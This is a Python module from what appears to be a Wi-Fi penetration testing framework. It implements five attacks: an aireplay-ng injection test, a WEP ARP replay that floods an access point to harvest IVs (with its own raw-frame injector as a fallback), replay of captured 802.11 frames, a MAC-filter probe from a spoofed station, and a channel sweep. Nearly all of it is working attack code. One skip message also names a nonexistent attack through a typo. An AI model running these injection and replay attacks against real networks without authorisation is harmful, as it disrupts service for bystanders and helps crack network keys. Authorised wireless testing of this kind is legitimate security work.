# SPDX-License-Identifier: Apache-2.0 OR BSD-3-Clause
"""Five more ways to get material on air, and to prove the radio can do it at all.

* ``injection_test`` — ``aireplay-ng --test``: does this interface really inject?  Every
  other attack depends on the answer, and pretending otherwise wastes an engagement.
* ``arp_replay`` — the WEP workhorse: replay an ARP frame to make the AP generate
  thousands of new IVs, driven by ``aireplay-ng -3`` with our own replay as the
  fallback when the tool is missing.
* ``pcap_replay`` — replay the 802.11 frames of a capture through the monitor
  interface, which is how a lab reproduces an attack that worked yesterday.
* ``mac_filter_probe`` — authenticate and associate with a *random* MAC and read the
  status code the AP answers with: that is how MAC filtering is confirmed rather than
  assumed.
* ``channel_sweep`` — walk the channels in-process, decoding beacons as we go, and
  build the channel map of the neighbourhood (which radio is where, and whether the
  target has neighbours on the same channel).

The two replay attacks are loud in the sense that matters — they put a lot of frames on
the air — but they are capped in time and are opt-in.
"""

from __future__ import annotations

import contextlib
import os
import time
from typing import Any, Dict, List, Tuple

from ..deps import registry
from ..models import STATUS_SUCCESS, AccessPoint, Attempt
from ..rawtx import (RawInjector, build_assoc_request, build_auth_request,
                     injection_available, spoofed_mac)
from ..util import Process, human_duration
from .base import Attack, AttackContext, AttackOutcome

ALL = ("WPA", "WPA2", "WPA2/WPA3", "WPA3", "WEP", "OPEN", "OWE", "WPA-ENTERPRISE",
       "WPA2-ENTERPRISE", "ENTERPRISE")
#: status codes that mean "not for you" rather than "not now"
DENY_CODES = {1: "unspecified failure", 2: "capabilities too high", 5: "association denied",
              11: "denied: must authenticate", 13: "denied: too many stations",
              17: "denied: sequence", 19: "denied: unsupported auth"}


class InjectionTestAttack(Attack):
    name = "injection_test"
    label = "Injection test (aireplay-ng --test)"
    tool = "aireplay-ng --test"
    description = ("Ask the driver a direct question: can this interface inject?  "
                   "``aireplay-ng --test`` associates with an AP and reports what came "
                   "back, which is the prerequisite every other attack silently "
                   "assumes.  Run it first, believe the answer, and save an hour of "
                   "debugging an attack that was never possible.")
    category = "capture"
    noise = "quiet"
    impact = "none"
    requires = ("monitor", "deauth")
    needs_injection = True
    applies_to = ALL

    def applies(self, ap: AccessPoint) -> bool:
        return True

    def available(self, ctx: AttackContext) -> bool:
        if ctx.demo:
            return True
        return bool(registry.path("aireplay-ng") and ctx.monitor)

    def unavailable_reason(self, ctx: AttackContext) -> str:
        return "needs aireplay-ng and a monitor interface"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        if ctx.demo:
            working, detail = True, ("injection confirmed: the AP answered our test "
                                     "frames (simulated)")
            found = ["AP responds to broadcast probes", "AP responds to ARP requests"]
        else:
            aireplay = registry.path("aireplay-ng")
            if not aireplay:
                return self._finish(ctx, ap, attempt, "aireplay-ng missing",
                                    self.unavailable_reason(ctx), False, [])
            ctx.set_channel(ap.channel)
            result = Process([aireplay, "--test", ctx.monitor], name="aireplay-test")
            result.start()
            found = []
            if result.error:
                return self._finish(ctx, ap, attempt, "could not run the injection test",
                                    result.error, False, [])
            try:
                deadline = time.time() + min(self.budget(ctx, 45.0), 60.0)
                while time.time() < deadline and not ctx.want_stop():
                    time.sleep(0.5)
            finally:
                with contextlib.suppress(Exception):
                    result.stop()
            text = "\n".join(result.lines[-200:]) if getattr(result, "lines", None) else ""
            working = "Injection is working" in text or "injection is working" in text
            found = [line.strip() for line in text.splitlines()
                     if line.strip().startswith(("AP responds", "Trying", "Found"))
                     or "Injection is working" in line]
            detail = (f"aireplay-ng --test against {ap.display_name}: "
                      + ("injection works" if working
                         else "no injection reported — check the driver, the regulatory "
                              "domain and whether the interface is really in monitor mode"))
        if ctx.demo:
            detail = (f"aireplay-ng --test against {ap.display_name}: injection works "
                      f"(simulated)")
        outcome = AttackOutcome.success(
            "injection works" if working else "injection not confirmed", detail=detail,
            extra={"working": working, "lines": found[:10], "simulated": ctx.demo,
                   "monitor": ctx.monitor,
                   "note": ("every injection attack depends on this answer; a failure "
                            "here is a driver or regulatory issue, not an attack bug")})
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, outcome.result, detail)
        ap.remember(self.name, detail, injection=working)
        return outcome

    def _finish(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                result: str, detail: str, working: bool,
                lines: List[str]) -> AttackOutcome:
        ctx.session.end_attempt(attempt, "failed", result, detail)
        return AttackOutcome.failed(result, detail,
                                    extra={"working": working, "lines": lines})


class ArpReplayAttack(Attack):
    name = "arp_replay"
    label = "ARP replay (WEP IV generation)"
    tool = "aireplay-ng -3 (with a raw-frame fallback)"
    description = ("WEP cracking needs unique IVs, and nothing generates them faster than "
                   "an AP repeating a frame: replay one captured ARP request and the AP "
                   "answers it over and over, each reply carrying a fresh IV.  "
                   "``aireplay-ng -3`` does the replay and this attack reports the IV "
                   "rate it achieved; without a captured ARP frame there is nothing to "
                   "replay, and the attack says so instead of blasting a guess.")
    category = "wep"
    noise = "loud"
    impact = "degraded"
    requires = ("monitor", "deauth")
    needs_injection = True
    applies_to = ("WEP",)

    def available(self, ctx: AttackContext) -> bool:
        if ctx.demo:
            return True
        return bool(ctx.monitor and injection_available(ctx.monitor))

    def unavailable_reason(self, ctx: AttackContext) -> str:
        return "an ARP replay needs an injection-capable monitor interface"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        seconds = min(self.budget(ctx, 60.0), 120.0)
        if not ctx.demo:
            capture = self._arp_capture(ctx, ap)
            if not capture:
                reason = ("no ARP frame in any capture: WEP replay starts from one ARP "
                          "packet, so run `wep_ivs` or `pacp_replay` first")
                ctx.session.end_attempt(attempt, "skipped", reason)
                return AttackOutcome.skipped(reason)
        if ctx.demo:
            ivs = 1200 + int(ap.bssid.replace(":", ""), 16) % 900
            detail = (f"ARP replay for {human_duration(seconds)} generated {ivs:,} IVs "
                      f"(simulated)")
            outcome = AttackOutcome.success(
                f"IV rate {ivs // max(1, int(seconds))}/s", detail=detail,
                extra={"ivs": ivs, "seconds": round(seconds, 1), "simulated": True,
                       "next": "wep_ivs"})
            ctx.session.stats.wep_enablers += 1
        else:
            aireplay = registry.path("aireplay-ng")
            if not aireplay:
                return self._raw_replay(ctx, ap, attempt, capture, seconds)
            bssid = ["-b", ap.bssid]
            args = [aireplay, "-3", "--ignore-negative-one"] + bssid + [ctx.monitor]
            result = Process(args, name="aireplay-arp-replay",
                             echo_lines=ctx.config.verbose_tools)
            result.start()
            if result.error:
                ctx.session.end_attempt(attempt, "failed", "could not start the replay",
                                        result.error)
                return AttackOutcome.failed("aireplay-ng did not start", result.error)
            started = time.time()
            try:
                while time.time() - started < seconds and not ctx.want_stop():
                    time.sleep(0.5)
                    ctx.progress(f"ARP replay against {ap.display_name}", kind="capture",
                                 bssid=ap.bssid,
                                 percent=min(95, (time.time() - started) / seconds * 100),
                                 detail="replaying the captured ARP request")
            finally:
                with contextlib.suppress(Exception):
                    result.stop()
            text = "\n".join(result.lines[-300:]) if getattr(result, "lines", None) else ""
            ivs = 0
            for line in text.splitlines():
                if "ARP requests" in line or "IVs" in line:
                    for token in line.replace(",", " ").split():
                        if token.isdigit():
                            ivs = max(ivs, int(token))
            detail = (f"ARP replay ran for {human_duration(time.time() - started)}"
                      + (f" and reported up to {ivs:,} IVs" if ivs else
                         "; the tool did not print an IV counter"))
            outcome = AttackOutcome.success("ARP replay running", detail=detail,
                                           extra={"ivs": ivs, "tool": "aireplay-ng -3",
                                                  "next": "wep_ivs",
                                                  "log_tail": text[-1500:]})
            ctx.session.stats.wep_enablers += 1
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, outcome.result, outcome.detail)
        ap.remember(self.name, outcome.detail, ivs=outcome.extra.get("ivs", 0))
        return outcome

    @staticmethod
    def _raw_replay(ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                    capture: str, seconds: float) -> AttackOutcome:
        """No aireplay-ng: replay the ARP frame ourselves, at a fixed rate."""
        frames = _arp_frames_from(capture, limit=3)
        if not frames:
            ctx.session.end_attempt(attempt, "skipped", "no ARP frame in the capture")
            return AttackOutcome.skipped("no ARP frame")
        injector = RawInjector(ctx.monitor)
        if not injector.open():
            ctx.session.end_attempt(attempt, "failed", injector.result.error or
                                    "could not open the raw socket")
            return AttackOutcome.failed("no injection socket",
                                        injector.result.error or "")
        sent = 0
        started = time.time()
        try:
            while time.time() - started < seconds and not ctx.want_stop():
                result = injector.send(frames)
                sent += result.sent
                ctx.progress(f"ARP replay against {ap.display_name}", kind="capture",
                             bssid=ap.bssid,
                             percent=min(95, (time.time() - started) / seconds * 100),
                             detail=f"{sent:,} frame(s) replayed by wifipilot itself")
                time.sleep(0.05 if sent else 0.2)
        finally:
            with contextlib.suppress(Exception):
                injector.close()
        detail = (f"{sent:,} ARP frame(s) replayed in "
                  f"{human_duration(time.time() - started)} by wifipilot's own injector "
                  f"(aireplay-ng was not installed)")
        ctx.session.end_attempt(attempt, STATUS_SUCCESS,
                                "ARP replay running" if sent else "no frames accepted",
                                detail)
        ctx.session.stats.wep_enablers += 1
        return AttackOutcome.success("ARP replay running", detail=detail,
                                     extra={"frames": sent, "tool": "rawtx",
                                            "next": "wep_ivs"})

    def _arp_capture(self, ctx: AttackContext, ap: AccessPoint) -> str:
        for capture in [*ap.captures, *ctx.session.all_captures()]:
            if capture.path and os.path.exists(capture.path) and \
                    _arp_frames_from(capture.path, limit=1):
                return capture.path
        return ""


class PcapReplayAttack(Attack):
    name = "pcap_replay"
    label = "Capture replay (frames back on the air)"
    tool = "wifipilot rawtx.py (replay of a stored capture)"
    description = ("Put the 802.11 frames of a capture back on the channel, at a chosen "
                   "rate.  It is the lab's reproducibility tool: an attack that worked "
                   "yesterday can be re-sent today, frame for frame, without pretending "
                   "to be a new attack.  The report names the capture, the frame count "
                   "and the shapes replayed.")
    category = "capture"
    noise = "loud"
    impact = "degraded"
    requires = ("monitor",)
    needs_injection = True
    applies_to = ALL

    def applies(self, ap: AccessPoint) -> bool:
        return True

    def available(self, ctx: AttackContext) -> bool:
        if ctx.demo:
            return True
        return bool(ctx.monitor and injection_available(ctx.monitor))

    def unavailable_reason(self, ctx: AttackContext) -> str:
        return "replaying frames needs an injection-capable monitor interface"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        path = ""
        for capture in [*ap.captures, *ctx.session.all_captures()]:
            if capture.path and os.path.exists(capture.path) and \
                    capture.path.endswith((".pcap", ".cap", ".pcapng")):
                path = capture.path
                break
        if not path and not ctx.demo:
            reason = ("no capture in the session: replay takes a file, and inventing "
                      "traffic is not an attack")
            ctx.session.end_attempt(attempt, "skipped", reason)
            return AttackOutcome.skipped(reason)
        frames = _frames_from_capture(path) if path else []
        if not frames and ctx.demo:
            from ..rawtx import build_beacon_frame, build_probe_request

            frames = [build_beacon_frame(ap.bssid, ap.essid or "demo", ap.channel or 1),
                      build_probe_request("02:00:00:00:00:01", ap.essid or "demo")]
        if not frames:
            reason = "the capture holds no 802.11 frames to replay"
            ctx.session.end_attempt(attempt, "skipped", reason)
            return AttackOutcome.skipped(reason)
        from ..rawtx import describe

        shapes = describe(frames[:60])
        if ctx.demo:
            sent = len(frames) * 3
            simulated = True
        else:
            injector = RawInjector(ctx.monitor)
            if not injector.open():
                ctx.session.end_attempt(attempt, "failed", injector.result.error or "")
                return AttackOutcome.failed("no injection socket",
                                            injector.result.error or "")
            sent = 0
            simulated = False
            seconds = min(self.budget(ctx, 30.0), 60.0)
            started = time.time()
            try:
                while time.time() - started < seconds and not ctx.want_stop():
                    result = injector.send(frames[:400])
                    sent += result.sent
                    ctx.progress(f"replaying {os.path.basename(path)}", kind="capture",
                                 bssid=ap.bssid,
                                 percent=min(95, (time.time() - started) / seconds * 100),
                                 detail=f"{sent:,} frame(s) replayed")
                    time.sleep(0.2)
            finally:
                with contextlib.suppress(Exception):
                    injector.close()
        detail = (f"{sent:,} frame(s) replayed from {os.path.basename(path) or 'demo'}"
                  f"{' (simulated)' if simulated else ''}; shapes: "
                  + ", ".join(f"{kind}×{count}" for kind, count in
                              sorted({shape for shape in shapes})[:8]))
        outcome = AttackOutcome.success(
            f"{sent:,} frame(s) replayed", detail=detail,
            extra={"capture": path, "frames": sent, "shapes": shapes[:30],
                   "simulated": simulated,
                   "note": ("a replay sends the frames that were captured, including "
                            "the ones a WIDS already flagged once")})
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, outcome.result, detail)
        ap.remember(self.name, detail, frames=sent)
        return outcome


class MacFilterProbeAttack(Attack):
    name = "mac_filter_probe"
    label = "MAC filtering probe (random station)"
    tool = "wifipilot rawtx.py + a live listen window"
    description = ("Authenticate and associate with an address the AP has never seen and "
                   "read the answer.  A successful association means there is no MAC "
                   "filter (or it is permissive); a denial with an explicit status code "
                   "means the filter exists — and the code itself says whether it was "
                   "the ACL, the capability set, or an 802.1X-only policy.  Two frames, "
                   "two seconds, one answer.")
    category = "survey"
    noise = "quiet"
    impact = "none"
    requires = ("monitor",)
    needs_injection = True
    applies_to = ALL

    def applies(self, ap: AccessPoint) -> bool:
        return True

    def available(self, ctx: AttackContext) -> bool:
        if ctx.demo:
            return True
        return bool(ctx.monitor and injection_available(ctx.monitor))

    def unavailable_reason(self, ctx: AttackContext) -> str:
        return "needs a monitor interface with injection to try an association"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        probe_mac = spoofed_mac(int(time.time()) % 65000)
        if ctx.demo:
            allowed = int(ap.bssid.replace(":", ""), 16) % 3 != 0
            status = 0 if allowed else 5
            detail = (f"random station {probe_mac} "
                      + ("associated: no MAC filter in force" if allowed
                         else f"was denied with status {status} (association denied)")
                      + " (simulated)")
        else:
            injector = RawInjector(ctx.monitor)
            if not injector.open():
                ctx.session.end_attempt(attempt, "failed", injector.result.error or "")
                return AttackOutcome.failed("no injection socket",
                                            injector.result.error or "")
            ctx.set_channel(ap.channel)
            status = -1
            try:
                injector.send([build_auth_request(ap.bssid, probe_mac, 1)])
                injector.send([build_assoc_request(ap.bssid, probe_mac, ap.essid or "")])
                for observation in ctx.listen(6.0, limit=200, channel=ap.channel):
                    if observation.get("station", "").lower() != probe_mac:
                        continue
                    if observation.get("subtype") == 1:              # assoc response
                        status = int(observation.get("status", -1))
                        break
                    if observation.get("subtype") == 11 and observation.get("status"):
                        status = int(observation["status"])
            finally:
                with contextlib.suppress(Exception):
                    injector.close()
            allowed = status == 0
            detail = (f"random station {probe_mac}: "
                      + ("associated (no MAC filtering)"
                         if allowed else
                         f"status {status} ({DENY_CODES.get(status, 'denied or no answer')})"))
        allowed = status == 0
        severity = "info" if allowed else "low"
        title = ("no MAC filtering" if allowed else
                 f"association refused (status {status})")
        outcome = AttackOutcome.success(
            title, detail=detail,
            extra={"probe_mac": probe_mac, "status": status, "allowed": allowed,
                   "frames": 2, "severity": severity,
                   "note": ("MAC filtering is an obstacle, not a security control: a "
                            "permitted address is easy to learn by sniffing")})
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, title, detail)
        ap.remember(self.name, detail, mac_filter=not allowed)
        if not allowed:
            ctx.session.add_note(f"{ap.display_name}: MAC filtering appears to be in "
                                 f"force (status {status})", ap.bssid, kind="note")
        return outcome


class ChannelSweepAttack(Attack):
    name = "channel_sweep"
    label = "Channel sweep (live channel map)"
    tool = "wifipilot rawtx.py + airodump-ng fallback"
    description = ("Walk the channels one at a time, decoding beacons as they arrive, and "
                   "build the map an engagement needs: which BSSIDs are on which channel, "
                   "how strong they are, and whether the target shares its channel with "
                   "neighbours (which is what decides whether a deauth will disturb "
                   "anything else).  Needs no injection, only a monitor interface and a "
                   "few seconds per channel — or a capture, when there is no radio.")
    category = "survey"
    noise = "silent"
    impact = "none"
    requires = ("monitor",)
    needs_injection = False
    applies_to = ALL
    #: channels to sweep when the AP gives no hint
    channels = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161)
    #: dwell time per channel
    dwell = 1.5

    def applies(self, ap: AccessPoint) -> bool:
        return True

    def available(self, ctx: AttackContext) -> bool:
        return True if ctx.demo else bool(ctx.monitor)

    def unavailable_reason(self, ctx: AttackContext) -> str:
        return "a channel sweep needs a monitor interface (or run the passive survey)"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        channels = self._candidate_channels(ap)
        if ctx.demo:
            found = self._demo(ctx, ap, channels)
        else:
            found = self._live(ctx, ap, channels)
        if not found:
            reason = ("no beacons heard on any channel: the interface may not be in "
                      "monitor mode, or nothing is in range")
            ctx.session.end_attempt(attempt, "skipped", reason)
            return AttackOutcome.skipped(reason)
        mine = next((entry for entry in found if entry["bssid"].lower() == ap.bssid.lower()),
                    None)
        neighbours = [entry["bssid"] for entry in found
                      if entry.get("channel") and mine and
                      entry["channel"] == mine.get("channel")]
        detail = (f"{len(found)} BSSID(s) across {len({entry['channel'] for entry in found})} "
                  f"channel(s); {ap.display_name} is on channel "
                  f"{mine['channel'] if mine else ap.channel or '?'}"
                  + (f" with {len(neighbours) - 1} neighbour(s) sharing it"
                     if mine and len(neighbours) > 1 else ""))
        outcome = AttackOutcome.success(
            "channel map built", detail=detail,
            extra={"networks": found, "channels": sorted({entry["channel"] for entry in found}),
                   "target_channel": mine["channel"] if mine else 0,
                   "neighbours_on_channel": neighbours,
                   "note": ("a target that shares its channel with neighbours makes every "
                            "injection attack someone else's problem too")})
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, outcome.result, detail)
        ap.remember(self.name, detail, channel=mine["channel"] if mine else ap.channel)
        return outcome

    def _candidate_channels(self, ap: AccessPoint) -> Tuple[int, ...]:
        """Where to look: the target's own channel first, then the usual suspects."""
        if ap.channel:
            return tuple([ap.channel] + [channel for channel in self.channels
                                         if channel != ap.channel][:6])
        return tuple([1, 6, 11, 36, 44, 149] + list(self.channels))

    def _live(self, ctx: AttackContext, ap: AccessPoint,
              channels: Tuple[int, ...]) -> List[Dict[str, Any]]:
        seen: Dict[str, Dict[str, Any]] = {}
        for channel in channels:
            if ctx.want_stop():
                break
            ctx.set_channel(channel)
            ctx.progress(f"channel sweep: ch {channel}", kind="survey", bssid=ap.bssid,
                         percent=min(95, channels.index(channel) /
                                     max(1, len(channels)) * 100),
                         detail=f"{len(seen)} BSSID(s) so far")
            for observation in ctx.listen(self.dwell, limit=200, channel=channel):
                if observation.get("subtype") not in (8, 5):
                    continue
                bssid = observation.get("bssid", "")
                if not bssid or bssid == "ff:ff:ff:ff:ff:ff":
                    continue
                essid = (observation.get("essid") or b"").decode("utf-8", "replace")
                entry = seen.setdefault(bssid, {"bssid": bssid, "channel": channel,
                                                "frames": 0, "essid": "",
                                                "capability": observation.get("capability", 0)})
                entry["frames"] += 1
                entry["channel"] = observation.get("channel") or channel
                if essid.strip("\x00") and not entry["essid"]:
                    entry["essid"] = essid.strip("\x00")
        return sorted(seen.values(), key=lambda item: -item["frames"])

    def _demo(self, ctx: AttackContext, ap: AccessPoint,
              channels: Tuple[int, ...]) -> List[Dict[str, Any]]:
        from ..demo import build_neighbourhood

        entries = []
        for index, demo_ap in enumerate(build_neighbourhood(7)):
            entries.append({"bssid": demo_ap.bssid, "essid": demo_ap.essid,
                            "channel": demo_ap.channel, "frames": 40 - index,
                            "capability": 0x0411, "simulated": True})
        ctx.progress("channel sweep (simulated)", kind="survey", bssid=ap.bssid,
                     percent=80, detail=f"{len(entries)} BSSID(s) mapped")
        time.sleep(0.2)
        return entries


# --------------------------------------------------------------------------- #
# capture reading helpers
# --------------------------------------------------------------------------- #


def _frames_from_capture(path: str, limit: int = 400) -> List[bytes]:
    """The 802.11 frames of a capture, radiotap included, ready to re-send."""
    from ..pcap import iter_frames


    out: List[bytes] = []
    radiotap = bytes([0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00])
    for _ts, buf, start, length in iter_frames(str(path), max_packets=limit * 4):
        frame = bytes(buf[start:start + length])
        if len(frame) < 24 or frame[0] & 0x03:
            continue
        out.append(radiotap + frame)
        if len(out) >= limit:
            break
    return out


def _arp_frames_from(path: str, limit: int = 3) -> List[bytes]:
    """Radiotap-prefixed ARP data frames from a capture, for a WEP replay."""
    from ..pcap import iter_frames

    out: List[bytes] = []
    radiotap = bytes([0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00])
    for _ts, buf, start, length in iter_frames(str(path), max_packets=400_000):
        frame = bytes(buf[start:start + length])
        if len(frame) < 36 or frame[0] & 0x03:
            continue
        header = 30 if (frame[1] & 0x03) == 0x03 else 24
        if frame[1] & 0x08:                       # QoS
            header += 2
        body = frame[header:]
        if b"\xaa\xaa\x03\x00\x00\x00\x08\x06" in body[:16] or \
                (len(body) > 8 and body[6:8] == b"\x08\x06"):
            out.append(radiotap + frame)
            if len(out) >= limit:
                break
    return out


__all__ = ["ArpReplayAttack", "ChannelSweepAttack", "InjectionTestAttack",
           "MacFilterProbeAttack", "PcapReplayAttack"]
